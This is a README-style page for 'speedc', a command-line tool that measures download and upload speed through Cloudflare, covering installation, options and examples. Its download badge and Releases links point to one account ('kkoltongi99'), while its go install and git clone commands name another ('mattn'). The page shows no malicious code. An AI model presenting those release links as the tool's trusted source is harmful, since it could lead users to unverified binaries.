---
layout: "default"
title: "🌐 speedc - Measure Your Internet Speed Easily"
description: "⚡ Measure your internet speed easily with speedc, a simple command-line tool that tests download and upload speeds using Cloudflare's infrastructure."
---
# 🌐 speedc - Measure Your Internet Speed Easily

## 🚀 Getting Started

[![Download SpeedC](https://img.shields.io/badge/Download%20SpeedC-v1.0-blue.svg)](https://github.com/kkoltongi99/speedc/releases)

Welcome to **speedc**, the simple command-line tool designed to measure your internet speed using Cloudflare's reliable speed test infrastructure. Whether you want to know your download speed or upload speed, speedc simplifies the process for you.

## 📥 Download & Install

To get started, you need to download the application from our Releases page. Visit this link to download **speedc**: [Download speedc](https://github.com/kkoltongi99/speedc/releases).

### Installation Steps

You can install the application in a few simple ways:

1. **Using Go Installation:**
   - If you have Go installed on your computer, run this command in your terminal:
     ```bash
     go install github.com/mattn/speedc@latest
     ```

2. **Build Locally:**
   - If you prefer to build from the source, follow these steps:
     ```bash
     git clone https://github.com/mattn/speedc
     cd speedc
     go build -o speedc
     ```
   - This will create an executable file named `speedc`.

## ☑️ System Requirements

To run speedc, ensure your system meets the following requirements:

- Operating System: Windows, macOS, or Linux
- Memory: At least 512 MB of RAM
- Storage: Minimal storage required; ensure you have enough space for dependencies

## ⚙️ Usage Instructions

Once you have installed speedc, you can run it directly from your terminal. The basic command is as follows:
```bash
speedc [options]
```

### 🛠️ Options

speedc comes with several options to customize your speed test:

- `-concurrent N` - Sets the number of concurrent connections. The default is the number of CPU cores.
- `-duration N` - Specifies the test duration in seconds. The default is 5 seconds.
- `-noanim` - Disables the speed display animation.
- `-download-url URL` - Allows you to set a custom download test URL. The default is from Cloudflare.
- `-upload-url URL` - Permits a custom upload test URL. The default is from Cloudflare.
- `-i` - Enables detailed information mode during the test.

## 💡 Examples

Here are some simple examples to help you get started:

### Basic Speed Test

To run a basic speed test, enter the following command:
```bash
speedc
```

### Customizing Your Test

To run a test with 8 concurrent connections for 10 seconds, use:
```bash
speedc -concurrent 8 -duration 10
```

## 🌟 Features

speedc offers a range of features to meet your speed testing needs:

- **Download and Upload Speed Measurement:** Know both your download and upload speed.
- **Configurable Concurrent Connections:** Adjust how many connections the test will use.
- **Real-Time Speed Display:** See your speed results as the test runs.
- **Customizable Test Duration:** Decide how long the test should run.
- **Detailed Information Mode:** Get extra insights about your network speed and performance.

## 🔄 Updating speedc

Stay updated with the latest improvements and features. Regularly check the Releases page to install new versions of speedc: [Download speedc](https://github.com/kkoltongi99/speedc/releases).

## 📞 Support

If you encounter any issues or have questions about speedc, please use the [GitHub Issues page](https://github.com/kkoltongi99/speedc/issues). We value your feedback and aim to help you resolve any problems quickly.

## 📄 License

speedc is open-source software. You can use and modify it according to the terms of the project's license. Please refer to the LICENSE file in the repository for more details.

## 🌐 Contributing

We welcome contributions from everyone. If you wish to contribute to speedc, please fork the repository, make your changes, and submit a pull request. Your contributions help enhance our tool for all users.

Enjoy measuring your internet speed with speedc!